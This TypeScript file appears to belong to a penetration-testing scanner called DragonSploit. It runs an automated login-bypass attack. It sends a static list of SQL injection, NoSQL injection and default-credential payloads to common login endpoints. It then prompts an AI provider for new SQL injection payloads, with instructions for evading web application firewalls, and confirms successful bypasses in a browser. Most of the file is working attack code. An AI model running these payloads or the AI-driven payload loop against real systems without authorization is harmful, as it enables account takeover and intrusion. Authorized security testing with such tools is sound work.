/**
 * Vector 0: Hybrid Auth Bypass Attack
 * 
 * 🔬 Research Sources:
 * - SQLMap-AI (github.com) - AI wrapper for SQLMap with adaptive testing
 * - Penligent AI (penligent.ai) - "AI-Driven Payload Evolution" concept
 * - Terra Security - AI agents that craft proof-of-concept exploits
 * 
 * 💡 Design Decision:
 * Hybrid approach: Static payloads first (fast, 0 tokens), then AI fallback
 * This is industry best practice used by SQLMap-AI and Penligent.
 * 
 * 🆕 What's unique to DragonSploit:
 * Static + AI + Visual Browser Verification + Video Recording
 * No other tool combines all four elements.
 */

import { Job } from 'bullmq';
import { PrismaClient, Severity, VulnerabilityType } from '@prisma/client';
import { URL, URLSearchParams } from 'url';
import { recordVulnerability, executeRequest } from './common';
import axios, { AxiosRequestConfig, AxiosResponse } from 'axios';
import { VisualVerifier, Severity as VisualSeverity } from '../../services/visual-verifier';
import { AIProvider } from '../../services/ai-provider';

// ============================================================================
// 🛠️ TYPES & INTERFACES
// ============================================================================

type PayloadValue = string | { [key: string]: any };

interface BypassPayload {
    email: PayloadValue;
    password: PayloadValue;
}

interface BypassTechnique {
    name: string;
    payload: BypassPayload;
    category: 'sqli' | 'nosqli' | 'logic';
}

interface AttackContext {
    endpoint: string;
    fingerprint: {
        database?: string;
        server?: string;
        waf?: string;
    };
    failedPayloads: string[];
    errorMessages: string[];
    responses: Array<{ status: number; length: number; hasError: boolean }>;
}

interface AttackResult {
    success: boolean;
    technique?: BypassTechnique;
    response?: AxiosResponse;
    context: AttackContext;
}

// ============================================================================
// 📚 STATIC PAYLOAD DICTIONARY
// Source: SQLMap default payloads + OWASP Testing Guide + SecLists
// ============================================================================

const STATIC_BYPASS_TECHNIQUES: BypassTechnique[] = [
    // --- Classic SQL Injection (most common, try first) ---
    { name: "Classic SQLi (OR 1=1)", payload: { email: "' OR 1=1 --", password: "password" }, category: 'sqli' },
    { name: "Admin Tautology", payload: { email: "admin'--", password: "password" }, category: 'sqli' },
    { name: "Password Bypass", payload: { email: "admin", password: "' OR '1'='1" }, category: 'sqli' },
    { name: "Double Quote SQLi", payload: { email: '" OR "1"="1', password: "password" }, category: 'sqli' },
    { name: "UNION Auth Bypass", payload: { email: "' UNION SELECT 1, 'admin', 'hash' --", password: "password" }, category: 'sqli' },
    { name: "Comment Bypass", payload: { email: "admin'/*", password: "*/'--" }, category: 'sqli' },
    
    // --- NoSQL Injection (MongoDB/CouchDB) ---
    { name: "NoSQLi (Not Equal)", payload: { email: { "$ne": "null" }, password: { "$ne": "null" } }, category: 'nosqli' },
    { name: "NoSQLi (Regex Wildcard)", payload: { email: { "$regex": ".*" }, password: { "$regex": ".*" } }, category: 'nosqli' },
    { name: "NoSQLi (GT Empty)", payload: { email: { "$gt": "" }, password: { "$gt": "" } }, category: 'nosqli' },
    { name: "NoSQLi (JS Injection)", payload: { email: "admin", password: { "$where": "function(){return true}" } }, category: 'nosqli' },

    // --- Logic Flaws ---
    { name: "Default Creds (Admin/Admin)", payload: { email: "admin", password: "admin" }, category: 'logic' },
    { name: "Empty Password", payload: { email: "admin", password: "" }, category: 'logic' },
    { name: "SQL Wildcard (*)", payload: { email: "*", password: "*" }, category: 'logic' }
];

// Common login endpoints to test
const LOGIN_ENDPOINTS = [
    '/rest/user/login',
    '/api/login',
    '/login',
    '/signin',
    '/auth/login',
    '/api/v1/auth/login',
    '/user/login',
    '/api/auth/signin'
];

// ============================================================================
// 🔓 MAIN ATTACK FUNCTION (HYBRID APPROACH)
// ============================================================================

export async function executeAuthBypassAttack(job: Job, prisma: PrismaClient): Promise<boolean> {
    const { targetUrl, scanId, technologyFingerprint } = job.data;
    console.log('[Vector 0] 🔓 Starting Hybrid Authentication Bypass Attack...');
    console.log('[Vector 0] 📚 Sources: SQLMap-AI, Penligent AI, Terra Security');
    
    // Initialize attack context
    const context: AttackContext = {
        endpoint: '',
        fingerprint: technologyFingerprint || {},
        failedPayloads: [],
        errorMessages: [],
        responses: []
    };

    // Find valid login endpoint
    for (const endpoint of LOGIN_ENDPOINTS) {
        const loginUrl = new URL(endpoint, targetUrl).toString();
        const checkProbe = await executeRequest(loginUrl);
        if (checkProbe.status !== 404) {
            context.endpoint = loginUrl;
            console.log(`[Vector 0] Found login endpoint: ${loginUrl}`);
            break;
        }
    }

    if (!context.endpoint) {
        console.log('[Vector 0] ⚠️ No login endpoint found. Skipping auth bypass.');
        return false;
    }

    // ════════════════════════════════════════════════════════════════════════
    // PHASE 1: STATIC QUICK WIN (0 tokens, fast)
    // Source: SQLMap uses this approach - try known payloads first
    // ════════════════════════════════════════════════════════════════════════
    console.log('\n[Vector 0] ═══ PHASE 1: Static Quick Win (0 tokens) ═══');
    
    const staticResult = await tryStaticBypass(context, scanId, prisma);
    if (staticResult.success) {
        console.log('[Vector 0] ✅ Phase 1 SUCCESS! Static payload worked.');
        return true;
    }
    
    console.log(`[Vector 0] Phase 1 completed. ${context.failedPayloads.length} payloads failed.`);
    console.log(`[Vector 0] Detected patterns: ${context.errorMessages.slice(0, 3).join(', ') || 'None'}`);

    // ════════════════════════════════════════════════════════════════════════
    // PHASE 2: AI FALLBACK (uses tokens, adaptive)
    // Source: Penligent AI's "AI-Driven Payload Evolution" concept
    // ════════════════════════════════════════════════════════════════════════
    console.log('\n[Vector 0] ═══ PHASE 2: AI Fallback (Adaptive) ═══');
    console.log('[Vector 0] 🤖 Sending context to AI for custom payload generation...');
    
    const aiResult = await tryAIBypass(context, scanId, prisma);
    if (aiResult.success) {
        console.log('[Vector 0] ✅ Phase 2 SUCCESS! AI-generated payload worked.');
        return true;
    }

    console.log('[Vector 0] ❌ Both phases failed. No auth bypass found.');
    return false;
}

// ============================================================================
// 🎯 PHASE 1: STATIC BYPASS (Fast, 0 tokens)
// ============================================================================

async function tryStaticBypass(
    context: AttackContext,
    scanId: string,
    prisma: PrismaClient
): Promise<AttackResult> {
    
    for (const technique of STATIC_BYPASS_TECHNIQUES) {
        try {
            console.log(`[Phase 1] Testing: ${technique.name}`);
            
            const config: AxiosRequestConfig = {
                method: 'POST',
                url: context.endpoint,
                data: technique.payload,
                headers: { 
                    'User-Agent': 'DragonSploit/3.0 (Hybrid Auth Scanner)',
                    'Content-Type': 'application/json'
                },
                timeout: 10000,
                validateStatus: () => true
            };

            let response = await axios(config);

            // Fallback to form-encoded if JSON rejected
            if (response.status === 415 || response.status === 406) {
                const params = new URLSearchParams();
                for (const [key, val] of Object.entries(technique.payload)) {
                    params.append(key, typeof val === 'object' ? JSON.stringify(val) : String(val));
                }
                config.headers!['Content-Type'] = 'application/x-www-form-urlencoded';
                config.data = params;
                response = await axios(config);
            }

            // Collect context for AI fallback
            const responseBody = JSON.stringify(response.data || '').toLowerCase();
            context.responses.push({
                status: response.status,
                length: responseBody.length,
                hasError: /error|invalid|failed|unauthorized/i.test(responseBody)
            });

            // Extract error messages for AI context
            const errorMatch = responseBody.match(/(sqlite|mysql|postgres|oracle|mssql|error|syntax)/gi);
            if (errorMatch) {
                context.errorMessages.push(...errorMatch);
            }

            // Detect WAF
            if (response.status === 403 || /blocked|forbidden|waf|firewall/i.test(responseBody)) {
                context.fingerprint.waf = 'detected';
            }

            // Analyze for success
            const analysisResult = analyzeResponse(response);
            
            if (analysisResult.isPotentialBypass) {
                console.log(`[Phase 1] 🔍 Potential bypass detected: ${technique.name}`);
                
                // Visual Verification
                const visualResult = await performVisualVerification(
                    context.endpoint,
                    technique,
                    scanId
                );

                if (visualResult.verified) {
                    console.log('[Phase 1] ✅✅✅ AUTH BYPASS VISUALLY CONFIRMED! ✅✅✅');
                    
                    await recordVulnerability(
                        prisma,
                        scanId,
                        VulnerabilityType.SQL_INJECTION,
                        Severity.CRITICAL,
                        `Authentication Bypass via ${technique.name} (Static Phase). ${visualResult.reason}`,
                        JSON.stringify({
                            phase: 'STATIC',
                            technique: technique.name,
                            payload: technique.payload,
                            visualProof: visualResult.proofs?.screenshotProof,
                            videoPath: visualResult.videoPath
                        })
                    );

                    return { success: true, technique, response, context };
                }
            }

            // Track failed payload for AI context
            const payloadStr = typeof technique.payload.email === 'string' 
                ? technique.payload.email 
                : JSON.stringify(technique.payload.email);
            context.failedPayloads.push(payloadStr);

        } catch (error: any) {
            if (!error.message.includes('timeout') && !error.message.includes('ECONNRESET')) {
                console.warn(`[Phase 1] ⚠️ Error testing ${technique.name}: ${error.message}`);
            }
        }
    }

    return { success: false, context };
}

// ============================================================================
// 🤖 PHASE 2: AI BYPASS (Adaptive, uses tokens)
// Source: Penligent AI's "AI-Driven Payload Evolution"
// ============================================================================

async function tryAIBypass(
    context: AttackContext,
    scanId: string,
    prisma: PrismaClient
): Promise<AttackResult> {
    
    const maxAIAttempts = 5;

    for (let attempt = 1; attempt <= maxAIAttempts; attempt++) {
        try {
            console.log(`[Phase 2] AI Attempt ${attempt}/${maxAIAttempts}`);

            // Build AI prompt with full context
            const aiResponse = await AIProvider.getPayload(
                buildAIPrompt(context, attempt),
                {
                    fingerprint: context.fingerprint,
                    previousPayloads: context.failedPayloads
                } as any
            );

            if (!aiResponse || !aiResponse.payload) {
                console.log('[Phase 2] AI returned no payload. Skipping.');
                continue;
            }

            console.log(`[Phase 2] AI Payload: "${aiResponse.payload}"`);
            console.log(`[Phase 2] AI Reasoning: ${aiResponse.reasoning || 'N/A'}`);

            // Test AI-generated payload
            const config: AxiosRequestConfig = {
                method: 'POST',
                url: context.endpoint,
                data: { email: aiResponse.payload, password: process.env.SCAN_PASSWORD || 'password' },
                headers: { 
                    'User-Agent': 'DragonSploit/3.0 (AI Auth Scanner)',
                    'Content-Type': 'application/json'
                },
                timeout: 10000,
                validateStatus: () => true
            };

            const response = await axios(config);
            const analysisResult = analyzeResponse(response);

            if (analysisResult.isPotentialBypass) {
                console.log('[Phase 2] 🔍 AI payload shows potential bypass!');

                const visualResult = await performVisualVerification(
                    context.endpoint,
                    { 
                        name: `AI-Generated (Attempt ${attempt})`, 
                        payload: { email: aiResponse.payload, password: process.env.SCAN_PASSWORD || 'password' },
                        category: 'sqli'
                    },
                    scanId
                );

                if (visualResult.verified) {
                    console.log('[Phase 2] ✅✅✅ AI AUTH BYPASS VISUALLY CONFIRMED! ✅✅✅');
                    
                    await recordVulnerability(
                        prisma,
                        scanId,
                        VulnerabilityType.SQL_INJECTION,
                        Severity.CRITICAL,
                        `Authentication Bypass via AI-generated payload. Reasoning: ${aiResponse.reasoning}`,
                        JSON.stringify({
                            phase: 'AI',
                            payload: aiResponse.payload,
                            reasoning: aiResponse.reasoning,
                            attempt: attempt,
                            visualProof: visualResult.proofs?.screenshotProof,
                            videoPath: visualResult.videoPath
                        })
                    );

                    return { success: true, context };
                }
            }

            // Add to failed payloads for next attempt
            context.failedPayloads.push(aiResponse.payload);

        } catch (error: any) {
            console.warn(`[Phase 2] ⚠️ AI attempt ${attempt} failed: ${error.message}`);
        }
    }

    return { success: false, context };
}

// ============================================================================
// 🔍 RESPONSE ANALYSIS
// ============================================================================

interface AnalysisResult {
    isPotentialBypass: boolean;
    indicators: string[];
}

function analyzeResponse(response: AxiosResponse): AnalysisResult {
    const body = JSON.stringify(response.data || '').toLowerCase();
    const headers = JSON.stringify(response.headers).toLowerCase();
    const indicators: string[] = [];

    // Strong indicators of successful auth
    const hasAuthToken = /token|bearer|jwt|access_key|session/.test(body) && body.length < 5000;
    const setsSessionCookie = /set-cookie/.test(headers) && /session|sid|auth|user/.test(headers);
    const isRedirectSuccess = (response.status === 302 || response.status === 301) && 
                              /dashboard|home|account|profile/.test(response.headers['location'] || '');
    const hasWelcomeMessage = /welcome|logged in|success|authenticated|hello/.test(body);
    const has200WithToken = response.status === 200 && hasAuthToken;

    if (hasAuthToken) indicators.push('auth_token_found');
    if (setsSessionCookie) indicators.push('session_cookie_set');
    if (isRedirectSuccess) indicators.push('redirect_to_dashboard');
    if (hasWelcomeMessage) indicators.push('welcome_message');
    if (has200WithToken) indicators.push('200_with_token');

    return {
        isPotentialBypass: indicators.length > 0,
        indicators
    };
}

// ============================================================================
// 🎬 VISUAL VERIFICATION (Unique to DragonSploit)
// ============================================================================

async function performVisualVerification(
    endpoint: string,
    technique: BypassTechnique,
    scanId: string
): Promise<any> {
    console.log('[Visual] 🎯 Starting browser verification...');

    const payloadStr = typeof technique.payload.email === 'string' 
        ? technique.payload.email 
        : JSON.stringify(technique.payload.email);

    const passwordStr = typeof technique.payload.password === 'string'
        ? technique.payload.password
        : 'password';

    // Convert API endpoint to UI login page
    const loginPageUrl = endpoint
        .replace('/rest/user/login', '/#/login')
        .replace('/api/login', '/login')
        .replace('/api/v1/auth/login', '/login');

    const verifier = new VisualVerifier({ headless: false });
    
    try {
        return await verifier.verifyAuthBypass(
            {
                loginUrl: loginPageUrl,
                payload: payloadStr,
                passwordValue: process.env.TEST_PASSWORD || "password",
            },
            {
                scanId: scanId,
                severity: VisualSeverity.CRITICAL,
                vulnerabilityType: 'AUTH_BYPASS'
            }
        );
    } finally {
        await verifier.close();
    }
}

// ============================================================================
// 🤖 AI PROMPT BUILDER
// Source: Penligent AI concept - context-aware prompt engineering
// ============================================================================

function buildAIPrompt(context: AttackContext, attempt: number): string {
    return `
You are an expert penetration tester specializing in authentication bypass.

TARGET CONTEXT:
- Endpoint: ${context.endpoint}
- Database: ${context.fingerprint.database || 'Unknown'}
- Server: ${context.fingerprint.server || 'Unknown'}
- WAF Detected: ${context.fingerprint.waf || 'No'}

FAILED PAYLOADS (do NOT repeat these):
${context.failedPayloads.slice(-5).map((p, i) => `${i + 1}. ${p}`).join('\n')}

ERROR PATTERNS OBSERVED:
${context.errorMessages.slice(0, 5).join(', ') || 'None'}

RESPONSE PATTERNS:
- Most common status: ${getMostCommonStatus(context.responses)}
- Average response length: ${getAverageLength(context.responses)}

ATTEMPT: ${attempt}/5

TASK:
Generate ONE unique SQL injection payload for authentication bypass.
${context.fingerprint.waf ? 'Use WAF evasion techniques (comments, case variation, encoding).' : ''}
${context.fingerprint.database === 'SQLite' ? 'Target SQLite. Use UNION-based or error-based. Avoid boolean/time-based.' : ''}

Respond in JSON: {"payload": "...", "reasoning": "...", "mode": "union|error|blind"}
`;
}

function getMostCommonStatus(responses: Array<{ status: number }>): number {
    if (responses.length === 0) return 0;
    const counts: Record<number, number> = {};
    responses.forEach(r => counts[r.status] = (counts[r.status] || 0) + 1);
    return parseInt(Object.entries(counts).sort((a, b) => b[1] - a[1])[0]?.[0] || '0');
}

function getAverageLength(responses: Array<{ length: number }>): number {
    if (responses.length === 0) return 0;
    return Math.round(responses.reduce((sum, r) => sum + r.length, 0) / responses.length);
}